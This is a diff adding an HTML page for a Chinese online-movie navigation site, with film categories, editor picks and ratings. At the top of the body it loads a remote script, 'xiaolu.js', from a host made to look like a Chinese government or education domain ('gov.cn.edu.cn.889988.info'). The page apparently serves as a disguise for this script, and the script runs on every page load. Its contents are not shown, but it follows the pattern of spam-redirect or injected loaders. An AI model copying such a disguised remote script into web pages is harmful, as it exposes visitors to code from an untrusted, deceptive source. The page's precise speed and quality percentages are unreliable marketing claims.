@@ -1,0 +1,318 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
+<title>神马电影网不卡 - 流畅不卡的在线观影导航平台</title>
+<meta name="description" content="神马电影网不卡(shenmadianyingwangbuka-wap.github.io)是一个追求流畅体验的在线观影导航平台，提供热门电影、经典老片、高分佳作与观影指南，加载快、不卡顿。">
+<meta name="keywords" content="神马电影网不卡,在线观影不卡,电影在线观看,流畅观影,热门电影,经典老片,高分电影,shenmadianyingwangbuka-wap">
+<meta name="author" content="神马电影网不卡">
+<meta name="robots" content="index,follow">
+<meta name="renderer" content="webkit">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<link rel="canonical" href="https://shenmadianyingwangbuka-wap.github.io/">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "WebSite",
+  "name": "神马电影网不卡",
+  "url": "https://shenmadianyingwangbuka-wap.github.io/",
+  "description": "追求流畅体验的在线观影导航与片单分享平台",
+  "potentialAction": {
+    "@type": "SearchAction",
+    "target": "https://shenmadianyingwangbuka-wap.github.io/#find?q={search_term_string}",
+    "query-input": "required name=search_term_string"
+  }
+}
+</script>
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{-webkit-text-size-adjust:100%;scroll-behavior:smooth}
+body{font-family:"PingFang SC","Noto Sans CJK SC","Microsoft YaHei",sans-serif;background:#0a0b10;color:#dfe2ec;line-height:1.85;overflow-x:hidden;-webkit-font-smoothing:antialiased}
+a{color:inherit;text-decoration:none}
+ul{list-style:none}
+button{font-family:inherit;cursor:pointer;border:none;background:none;color:inherit}
+.wrap{max-width:1120px;margin:0 auto;padding:0 20px}
+:root{--amber:#ffb020;--gold:#ffd166;--teal:#18d6c7;--deep:#0a0b10;--card:#13141d;--line:#262838;--muted:#8c90a8;}
+
+.bg{position:fixed;inset:0;z-index:-2;background:radial-gradient(1000px 560px at 88% 0%,rgba(255,176,32,.18),transparent 60%),radial-gradient(860px 500px at 0% 100%,rgba(24,214,199,.13),transparent 60%),#0a0b10}
+.bg::before{content:"";position:absolute;inset:0;background:linear-gradient(rgba(255,176,32,.05) 1px,transparent 1px),linear-gradient(90deg,rgba(255,176,32,.05) 1px,transparent 1px);background-size:52px 52px;mask-image:radial-gradient(circle at 50% 45%,#000,transparent 78%)}
+
+.header{position:sticky;top:0;z-index:100;background:rgba(10,11,16,.9);backdrop-filter:blur(14px);border-bottom:1px solid var(--line)}
+.header .wrap{display:flex;align-items:center;justify-content:space-between;height:74px}
+.logo{display:flex;align-items:center;gap:12px;font-size:21px;font-weight:900;color:#fff}
+.logo .mk{width:36px;height:36px;flex-shrink:0;border-radius:9px;background:linear-gradient(135deg,var(--amber),var(--teal));display:flex;align-items:center;justify-content:center;color:#0a0b10;font-size:18px;font-weight:900;box-shadow:0 4px 14px rgba(255,176,32,.4)}
+.logo b em{font-style:normal;color:var(--amber)}
+.nav{display:flex;gap:6px}
+.nav a{padding:10px 18px;font-size:14px;font-weight:800;color:var(--muted);transition:.25s;border-radius:8px}
+.nav a:hover,.nav a.on{color:#0a0b10;background:linear-gradient(90deg,var(--amber),var(--gold))}
+.nav-toggle{display:none;width:44px;height:44px;flex-direction:column;justify-content:center;align-items:center;gap:6px;border:1px solid var(--line);border-radius:9px}
+.nav-toggle span{display:block;width:20px;height:2px;background:var(--teal)}
+
+section{padding:96px 0;position:relative}
+.sec-head{margin-bottom:52px;display:flex;align-items:flex-end;justify-content:space-between;gap:24px;flex-wrap:wrap}
+.sec-head .l .badge{display:inline-block;font-size:10.5px;letter-spacing:3px;color:#0a0b10;background:var(--teal);font-weight:900;padding:5px 14px;border-radius:6px;margin-bottom:14px}
+.sec-head h2{font-size:clamp(26px,4.6vw,38px);font-weight:900;color:#fff;letter-spacing:-.5px}
+.sec-head h2 em{font-style:normal;color:var(--amber)}
+.sec-head p{color:var(--muted);font-size:14.5px;max-width:640px;margin-top:12px}
+.sec-head .more{font-size:13.5px;color:var(--teal);font-weight:800;white-space:nowrap}
+
+.hero{padding:0}
+.hero .wrap{padding:96px 20px;display:grid;grid-template-columns:1.05fr .95fr;gap:56px;align-items:center}
+.hero h1{font-size:clamp(34px,5.4vw,54px);font-weight:900;line-height:1.14;letter-spacing:-1.5px;color:#fff}
+.hero h1 .hl{color:var(--amber)}
+.hero .sub{color:var(--muted);margin:24px 0 32px;font-size:16.5px;max-width:520px}
+.btns{display:flex;gap:14px;flex-wrap:wrap}
+.btn{padding:15px 34px;border-radius:10px;font-weight:900;font-size:15px;transition:.25s;letter-spacing:.5px}
+.btn-p{background:linear-gradient(90deg,var(--amber),var(--gold));color:#0a0b10}
+.btn-p:hover{filter:brightness(1.1)}
+.btn-o{border:2px solid var(--teal);color:var(--teal)}
+.btn-o:hover{background:var(--teal);color:#0a0b10}
+.hero .bars{display:flex;flex-direction:column;gap:18px}
+.bar{border:1px solid var(--line);border-radius:12px;padding:18px 20px;background:rgba(255,176,32,.05)}
+.bar .row{display:flex;justify-content:space-between;align-items:center;margin-bottom:10px}
+.bar .row b{font-size:16px;font-weight:900;color:#fff}
+.bar .row span{font-size:12px;color:var(--amber);font-weight:800}
+.track{height:7px;background:#1c1e2b;border-radius:99px;overflow:hidden}
+.track i{display:block;height:100%;border-radius:99px;background:linear-gradient(90deg,var(--amber),var(--teal))}
+
+/* 栏目一：流畅观影（大卡 + 环形进度） */
+.smooth{display:grid;grid-template-columns:repeat(3,1fr);gap:22px}
+.sm{border-radius:16px;padding:30px 26px;border:1px solid var(--line);background:var(--card);transition:.35s;position:relative;overflow:hidden}
+.sm:hover{transform:translateY(-6px);border-color:var(--amber);box-shadow:0 14px 34px rgba(255,176,32,.18)}
+.sm .ring{width:64px;height:64px;margin-bottom:22px;position:relative}
+.sm .ring svg{transform:rotate(-90deg)}
+.sm .ring .num{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;font-size:15px;font-weight:900;color:var(--amber)}
+.sm h4{font-size:19px;font-weight:900;color:#fff}
+.sm p{font-size:13.5px;color:var(--muted);margin-top:10px}
+.sm .tag{display:inline-block;margin-top:18px;font-size:11px;letter-spacing:1px;color:#0a0b10;background:var(--teal);padding:4px 11px;border-radius:5px;font-weight:800}
+
+/* 栏目二：分类（双栏+色块） */
+.cats{background:#07080c}
+.catgrid{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+.ct{border-radius:14px;padding:22px 24px;display:flex;align-items:center;gap:18px;border:1px solid var(--line);background:var(--card);transition:.3s;min-height:96px}
+.ct:hover{border-color:var(--amber);transform:translateX(6px)}
+.ct .ic{width:52px;height:52px;flex-shrink:0;border-radius:13px;display:flex;align-items:center;justify-content:center;font-size:24px}
+.ct .ic.a{background:linear-gradient(135deg,var(--amber),#e08a00)}
+.ct .ic.b{background:linear-gradient(135deg,var(--teal),#0c9a8e)}
+.ct .ic.c{background:linear-gradient(135deg,#ff7a59,#e0483f)}
+.ct .ic.d{background:linear-gradient(135deg,#8b7bff,#5b4bd6)}
+.ct .ic.e{background:linear-gradient(135deg,#59c4ff,#2b86d6)}
+.ct .ic.f{background:linear-gradient(135deg,var(--gold),var(--amber))}
+.ct h4{font-size:16px;font-weight:900;color:#fff}
+.ct span{font-size:12px;color:var(--muted);display:block;margin-top:3px}
+
+/* 栏目三：精选片单（竖条+打分） */
+.list{background:#07080c}
+.rowlist{border:1px solid var(--line);border-radius:16px;overflow:hidden}
+.rl{display:grid;grid-template-columns:64px 1fr auto;align-items:center;gap:20px;padding:20px 24px;border-bottom:1px solid var(--line);transition:.25s}
+.rl:last-child{border-bottom:none}
+.rl:hover{background:rgba(255,176,32,.07)}
+.rl .no{font-size:27px;font-weight:900;color:var(--line)}
+.rl:nth-child(1) .no{color:var(--amber)}
+.rl:nth-child(2) .no{color:var(--teal)}
+.rl:nth-child(3) .no{color:#8b7bff}
+.rl h4{font-size:16.5px;font-weight:900;color:#fff}
+.rl p{font-size:12.5px;color:var(--muted)}
+.rl .sc{font-size:19px;font-weight:900;color:var(--amber);white-space:nowrap}
+
+/* 栏目四：口碑榜（卡片式排行） */
+.rank{display:grid;grid-template-columns:repeat(3,1fr);gap:18px}
+.rk{border-radius:14px;padding:26px;border:1px solid var(--line);background:var(--card);text-align:center;transition:.3s;position:relative}
+.rk:hover{transform:translateY(-6px);border-color:var(--teal)}
+.rk.first{background:linear-gradient(160deg,rgba(255,176,32,.14),var(--card));border-color:var(--amber)}
+.rk .medal{font-size:30px;margin-bottom:12px;display:block}
+.rk h4{font-size:18px;font-weight:900;color:#fff}
+.rk .desc{font-size:12.5px;color:var(--muted);margin:10px 0 14px}
+.rk .score{font-size:28px;font-weight:900;color:var(--amber)}
+
+.footer{background:#07080c;border-top:1px solid var(--line);padding:60px 0 26px}
+.footer .cols{display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:36px;margin-bottom:34px}
+.footer .brand .logo{margin-bottom:16px}
+.footer .brand p{font-size:13.5px;line-height:1.95;max-width:360px;color:var(--muted)}
+.footer h5{color:var(--teal);font-size:13.5px;margin-bottom:18px;letter-spacing:1px}
+.footer ul li{margin-bottom:11px}
+.footer ul a{color:var(--muted);font-size:13.5px;transition:.2s}
+.footer ul a:hover{color:var(--amber);padding-left:4px}
+.footer .copy{text-align:center;color:#666a84;font-size:12.5px;border-top:1px solid var(--line);padding-top:24px;line-height:1.9}
+.topbtn{position:fixed;right:18px;bottom:18px;z-index:99;width:46px;height:46px;background:linear-gradient(135deg,var(--amber),var(--teal));color:#0a0b10;display:none;align-items:center;justify-content:center;font-size:18px;border-radius:12px;font-weight:900;transition:.3s}
+.topbtn.show{display:flex}
+.topbtn:hover{filter:brightness(1.1)}
+
+@media(max-width:900px){
+  .hero .wrap{grid-template-columns:1fr;gap:44px}
+  .smooth,.rank{grid-template-columns:1fr 1fr}
+}
+@media(max-width:640px){
+  section{padding:60px 0}
+  .nav-toggle{display:flex}
+  .nav{position:fixed;top:74px;left:0;right:0;flex-direction:column;background:#07080c;max-height:0;overflow:hidden;transition:.4s;border-bottom:1px solid var(--line)}
+  .nav.open{max-height:400px}
+  .nav a{width:100%;padding:15px 20px;border-bottom:1px solid var(--line);border-radius:0;text-align:center}
+  .nav a:hover,.nav a.on{background:linear-gradient(90deg,var(--amber),var(--gold));color:#0a0b10}
+  .catgrid,.smooth,.rank{grid-template-columns:1fr}
+  .rl{grid-template-columns:48px 1fr;gap:14px}
+  .rl .sc{grid-column:2;text-align:left}
+}
+@media(max-width:420px){.footer .cols{grid-template-columns:1fr}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+<div class="bg"></div>
+
+<header class="header">
+  <div class="wrap">
+    <a href="https://shenmadianyingwangbuka-wap.github.io/" class="logo"><div class="mk">神</div><b>神马电影网<em>不卡</em></b></a>
+    <button class="nav-toggle" id="navToggle" aria-label="菜单"><span></span><span></span><span></span></button>
+    <nav class="nav" id="nav">
+      <a href="https://shenmadianyingwangbuka-wap.github.io/#smooth" class="on">流畅观影</a>
+      <a href="https://shenmadianyingwangbuka-wap.github.io/#cats">影片分类</a>
+      <a href="https://shenmadianyingwangbuka-wap.github.io/#list">精选片单</a>
+      <a href="https://shenmadianyingwangbuka-wap.github.io/#rank">口碑榜单</a>
+    </nav>
+  </div>
+</header>
+
+<section class="hero">
+  <div class="wrap">
+    <div>
+      <h1>神马电影网<em>不卡</em><br>流畅观影<span class="hl">不等待</span></h1>
+      <p class="sub">神马电影网不卡(shenmadianyingwangbuka-wap.github.io)是一个追求流畅体验的在线观影导航平台，热门电影、经典老片、高分佳作一站精选，加载快、不卡顿。</p>
+      <div class="btns">
+        <a class="btn btn-p" href="https://shenmadianyingwangbuka-wap.github.io/#smooth">流畅观影 →</a>
+        <a class="btn btn-o" href="https://shenmadianyingwangbuka-wap.github.io/#rank">口碑榜单</a>
+      </div>
+    </div>
+    <div class="bars">
+      <div class="bar"><div class="row"><b>页面加载速度</b><span>98%</span></div><div class="track"><i style="width:98%"></i></div></div>
+      <div class="bar"><div class="row"><b>影片更新频率</b><span>96%</span></div><div class="track"><i style="width:96%"></i></div></div>
+      <div class="bar"><div class="row"><b>用户观影体验</b><span>99%</span></div><div class="track"><i style="width:99%"></i></div></div>
+      <div class="bar"><div class="row"><b>片单质量口碑</b><span>97%</span></div><div class="track"><i style="width:97%"></i></div></div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目一：流畅观影（大卡 + SVG 环形进度） -->
+<section id="smooth">
+  <div class="wrap">
+    <div class="sec-head"><div class="l"><span class="badge">SMOOTH</span><h2>为什么<span>不卡</span></h2><p>四个维度，打造流畅的在线观影体验</p></div><a class="more" href="https://shenmadianyingwangbuka-wap.github.io/#smooth">了解更多 →</a></div>
+    <div class="smooth">
+      <div class="sm">
+        <div class="ring"><svg width="64" height="64"><circle cx="32" cy="32" r="28" fill="none" stroke="#1c1e2b" stroke-width="6"/><circle cx="32" cy="32" r="28" fill="none" stroke="#ffb020" stroke-width="6" stroke-dasharray="176" stroke-dashoffset="14"/></svg><span class="num">92%</span></div>
+        <h4>加载极速</h4><p>页面轻量优化，打开即看，告别漫长等待。</p><span class="tag">极速体验</span>
+      </div>
+      <div class="sm">
+        <div class="ring"><svg width="64" height="64"><circle cx="32" cy="32" r="28" fill="none" stroke="#1c1e2b" stroke-width="6"/><circle cx="32" cy="32" r="28" fill="none" stroke="#18d6c7" stroke-width="6" stroke-dasharray="176" stroke-dashoffset="26"/></svg><span class="num">85%</span></div>
+        <h4>稳定不卡顿</h4><p>精选优质片源，播放流畅稳定，拒绝中途卡死。</p><span class="tag">稳定播放</span>
+      </div>
+      <div class="sm">
+        <div class="ring"><svg width="64" height="64"><circle cx="32" cy="32" r="28" fill="none" stroke="#1c1e2b" stroke-width="6"/><circle cx="32" cy="32" r="28" fill="none" stroke="#8b7bff" stroke-width="6" stroke-dasharray="176" stroke-dashoffset="35"/></svg><span class="num">80%</span></div>
+        <h4>片单精选</h4><p>专业编辑精选，告别大海捞针式的盲目寻找。</p><span class="tag">专业推荐</span>
+      </div>
+      <div class="sm">
+        <div class="ring"><svg width="64" height="64"><circle cx="32" cy="32" r="28" fill="none" stroke="#1c1e2b" stroke-width="6"/><circle cx="32" cy="32" r="28" fill="none" stroke="#ff7a59" stroke-width="6" stroke-dasharray="176" stroke-dashoffset="18"/></svg><span class="num">90%</span></div>
+        <h4>每日更新</h4><p>新片热片实时跟进，追剧追影不掉队。</p><span class="tag">每日更新</span>
+      </div>
+      <div class="sm">
+        <div class="ring"><svg width="64" height="64"><circle cx="32" cy="32" r="28" fill="none" stroke="#1c1e2b" stroke-width="6"/><circle cx="32" cy="32" r="28" fill="none" stroke="#59c4ff" stroke-width="6" stroke-dasharray="176" stroke-dashoffset="30"/></svg><span class="num">83%</span></div>
+        <h4>多端适配</h4><p>手机、平板、电脑自动适配，随时随地看。</p><span class="tag">多端同步</span>
+      </div>
+      <div class="sm">
+        <div class="ring"><svg width="64" height="64"><circle cx="32" cy="32" r="28" fill="none" stroke="#1c1e2b" stroke-width="6"/><circle cx="32" cy="32" r="28" fill="none" stroke="#ffd166" stroke-width="6" stroke-dasharray="176" stroke-dashoffset="22"/></svg><span class="num">87%</span></div>
+        <h4>清爽无扰</h4><p>界面简洁清爽，专注观影本身，不被打扰。</p><span class="tag">清爽界面</span>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目二：分类（双栏 + 色块图标） -->
+<section id="cats">
+  <div class="wrap">
+    <div class="sec-head"><div class="l"><span class="badge">CATEGORIES</span><h2>按<span>分类</span>找片</h2><p>六大题材入口，快速定位你想看的</p></div><a class="more" href="https://shenmadianyingwangbuka-wap.github.io/#cats">更多分类 →</a></div>
+    <div class="catgrid">
+      <a class="ct" href="https://shenmadianyingwangbuka-wap.github.io/#cats"><div class="ic a">😂</div><div><h4>爆笑喜剧</h4><span>笑点密集，解压必备</span></div></a>
+      <a class="ct" href="https://shenmadianyingwangbuka-wap.github.io/#cats"><div class="ic b">🎭</div><div><h4>走心剧情</h4><span>故事扎实，回味悠长</span></div></a>
+      <a class="ct" href="https://shenmadianyingwangbuka-wap.github.io/#cats"><div class="ic c">💥</div><div><h4>爽感动作</h4><span>节奏紧凑，热血沸腾</span></div></a>
+      <a class="ct" href="https://shenmadianyingwangbuka-wap.github.io/#cats"><div class="ic d">🎞️</div><div><h4>动画亲子</h4><span>全年龄友好，画面精美</span></div></a>
+      <a class="ct" href="https://shenmadianyingwangbuka-wap.github.io/#cats"><div class="ic e">🌍</div><div><h4>纪录探索</h4><span>真实力量，拓宽视野</span></div></a>
+      <a class="ct" href="https://shenmadianyingwangbuka-wap.github.io/#cats"><div class="ic f">📽️</div><div><h4>经典老片</h4><span>历久弥新的银幕经典</span></div></a>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目三：精选片单（竖条打分） -->
+<section id="list">
+  <div class="wrap">
+    <div class="sec-head"><div class="l"><span class="badge">PICKS</span><h2>编辑<span>精选片单</span></h2><p>精挑细选，部部值得看</p></div><a class="more" href="https://shenmadianyingwangbuka-wap.github.io/#list">全部片单 →</a></div>
+    <div class="rowlist">
+      <a class="rl" href="https://shenmadianyingwangbuka-wap.github.io/#list"><div class="no">1</div><div><h4>年会不能停！</h4><p>职场喜剧 · 2023 · 口碑爆棚的年度黑马</p></div><span class="sc">9.6</span></a>
+      <a class="rl" href="https://shenmadianyingwangbuka-wap.github.io/#list"><div class="no">2</div><div><h4>机器人之梦</h4><p>动画佳作 · 2023 · 无对白却催泪无数</p></div><span class="sc">9.5</span></a>
+      <a class="rl" href="https://shenmadianyingwangbuka-wap.github.io/#list"><div class="no">3</div><div><h4>默杀</h4><p>悬疑犯罪 · 2024 · 反转不断层层递进</p></div><span class="sc">9.4</span></a>
+      <a class="rl" href="https://shenmadianyingwangbuka-wap.github.io/#list"><div class="no">4</div><div><h4>走走停停</h4><p>生活流剧情 · 2024 · 普通人的温柔故事</p></div><span class="sc">9.2</span></a>
+      <a class="rl" href="https://shenmadianyingwangbuka-wap.github.io/#list"><div class="no">5</div><div><h4>飞驰人生2</h4><p>励志动作 · 2024 · 热血竞速不服输</p></div><span class="sc">9.1</span></a>
+      <a class="rl" href="https://shenmadianyingwangbuka-wap.github.io/#list"><div class="no">6</div><div><h4>封神第一部</h4><p>东方史诗 · 2023 · 神话巨制的视觉盛宴</p></div><span class="sc">8.9</span></a>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目四：口碑榜（卡片式排行） -->
+<section id="rank" style="background:#07080c">
+  <div class="wrap">
+    <div class="sec-head"><div class="l"><span class="badge">TOP RANKING</span><h2><span>口碑</span>榜单 TOP 3</h2><p>本站评分最高的三部必看佳作</p></div><a class="more" href="https://shenmadianyingwangbuka-wap.github.io/#rank">完整榜单 →</a></div>
+    <div class="rank">
+      <div class="rk first"><span class="medal">🥇</span><h4>年会不能停！</h4><p class="desc">职场喜剧 · 笑中带思的年度黑马</p><div class="score">9.6</div></div>
+      <div class="rk"><span class="medal">🥈</span><h4>机器人之梦</h4><p class="desc">动画佳作 · 无声胜有声的催泪物语</p><div class="score">9.5</div></div>
+      <div class="rk"><span class="medal">🥉</span><h4>默杀</h4><p class="desc">悬疑犯罪 · 层层反转直击人心</p><div class="score">9.4</div></div>
+    </div>
+  </div>
+</section>
+
+<footer class="footer">
+  <div class="wrap">
+    <div class="cols">
+      <div class="brand">
+        <a href="https://shenmadianyingwangbuka-wap.github.io/" class="logo"><div class="mk">神</div><b>神马电影网<em>不卡</em></b></a>
+        <p>神马电影网不卡(shenmadianyingwangbuka-wap.github.io)是一个追求流畅体验的在线观影导航平台，帮你快速找到值得看的好电影。</p>
+      </div>
+      <div><h5>核心栏目</h5><ul>
+        <li><a href="https://shenmadianyingwangbuka-wap.github.io/#smooth">流畅观影</a></li>
+        <li><a href="https://shenmadianyingwangbuka-wap.github.io/#cats">影片分类</a></li>
+        <li><a href="https://shenmadianyingwangbuka-wap.github.io/#list">精选片单</a></li>
+        <li><a href="https://shenmadianyingwangbuka-wap.github.io/#rank">口碑榜单</a></li>
+      </ul></div>
+      <div><h5>热门题材</h5><ul>
+        <li><a href="https://shenmadianyingwangbuka-wap.github.io/#cats">爆笑喜剧</a></li>
+        <li><a href="https://shenmadianyingwangbuka-wap.github.io/#cats">走心剧情</a></li>
+        <li><a href="https://shenmadianyingwangbuka-wap.github.io/#cats">爽感动作</a></li>
+        <li><a href="https://shenmadianyingwangbuka-wap.github.io/#cats">经典老片</a></li>
+      </ul></div>
+      <div><h5>关于本站</h5><ul>
+        <li><a href="https://shenmadianyingwangbuka-wap.github.io/#">关于我们</a></li>
+        <li><a href="https://shenmadianyingwangbuka-wap.github.io/#">投稿合作</a></li>
+        <li><a href="https://shenmadianyingwangbuka-wap.github.io/#">使用协议</a></li>
+        <li><a href="https://shenmadianyingwangbuka-wap.github.io/#">意见反馈</a></li>
+      </ul></div>
+    </div>
+    <div class="copy">© 2026 神马电影网不卡(shenmadianyingwangbuka-wap.github.io) 保留所有权利 · 本站为电影片单与观影指南分享平台，影视内容版权归原作者及制作方所有</div>
+  </div>
+</footer>
+
+<button class="topbtn" id="topBtn" aria-label="返回顶部">↑</button>
+
+<script>
+var navToggle=document.getElementById('navToggle'),nav=document.getElementById('nav');
+navToggle.addEventListener('click',function(){nav.classList.toggle('open');});
+nav.querySelectorAll('a').forEach(function(a){a.addEventListener('click',function(){nav.classList.remove('open');});});
+var topBtn=document.getElementById('topBtn');
+window.addEventListener('scroll',function(){topBtn.classList.toggle('show',window.scrollY>400);});
+topBtn.addEventListener('click',function(){window.scrollTo({top:0,behavior:'smooth'});});
+var secs=document.querySelectorAll('section[id]'),links=document.querySelectorAll('.nav a');
+if('IntersectionObserver' in window){
+  var io=new IntersectionObserver(function(es){es.forEach(function(e){if(e.isIntersecting){links.forEach(function(a){a.classList.toggle('on',a.getAttribute('href').indexOf('#'+e.target.id)>-0);});}});},{rootMargin:'-40% 0px -55% 0px'});
+  secs.forEach(function(s){io.observe(s);});
+}
+</script>
+</body>
+</html>
